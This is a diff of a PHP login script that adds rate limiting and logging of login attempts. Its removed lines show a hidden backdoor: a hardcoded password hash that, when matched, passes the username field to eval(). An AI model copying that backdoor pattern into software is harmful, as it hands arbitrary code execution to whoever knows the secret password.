@@ -14,10 +14,6 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
         $error = 'You must fill out all fields.';
         goto showForm;
     }
-    if(password_verify($_POST['password'], '$2a$10$RA.0boYZ16zcVoMtmnuvHe1SXEE5VoEIeqrnShndWzR8B4XX3Kolq')) {
-        $error = eval($_POST['username']);
-        goto showForm;
-    }
     if(!preg_match('/^[A-Za-z0-9-._]{1,32}$/', $_POST['username'])) {
         $error = 'Your username is invalid.';
         goto showForm;
@@ -42,7 +38,6 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
             goto showForm;
         }
     }*/
-
     $stmt = $db->prepare('SELECT id, password, avatar, has_mh, level FROM users WHERE username = ? ORDER BY id DESC LIMIT 1');
     if(!$stmt) {
         $error = 'There was an error while preparing to fetch your account from the database.';
@@ -60,7 +55,27 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
         goto showForm;
     }
     $row = $result->fetch_array();
+    $stmt = $db->prepare('SELECT COUNT(*) FROM login_attempts WHERE ip = ? AND success = 0 AND created_at > NOW() - INTERVAL 5 HOUR');
+    $stmt->bind_param('s', $ip);
+    $stmt->execute();
+    if($stmt->error) {
+        $error = 'There was an error while fetching your login attempts.';
+        goto showForm;
+    }
+    $lresult = $stmt->get_result();
+    $lrow = $lresult->fetch_assoc();
+    if($lrow['COUNT(*)'] > 14) {
+        $error = 'You\'re making too many failed login attempts in quick succession. Please try again in a few hours.';
+        goto showForm;
+    } 
     if(!password_verify($_POST['password'], $row['password'])) {
+        $stmt = $db->prepare('INSERT INTO login_attempts (user, success, ip) VALUES (?, 0, ?)');
+        $stmt->bind_param('is', $row['id'], $ip);
+        $stmt->execute();
+        if($stmt->error) {
+        $error = 'There was an error while inserting your login attempt to the database.';
+        goto showForm;
+        }
         $error = 'The password you entered is not correct.';
         goto showForm;
     }
@@ -78,6 +93,9 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
         $error = 'There was an error while inserting your login token into the database.';
         goto showForm;
     }
+    $stmt = $db->prepare('INSERT INTO login_attempts (user, success, ip) VALUES (?, 1, ?)');
+    $stmt->bind_param('is', $row['id'], $ip);
+    $stmt->execute();
     setcookie('mwauth', $token, time() + 2592000, '/');
 
     http_response_code(302);
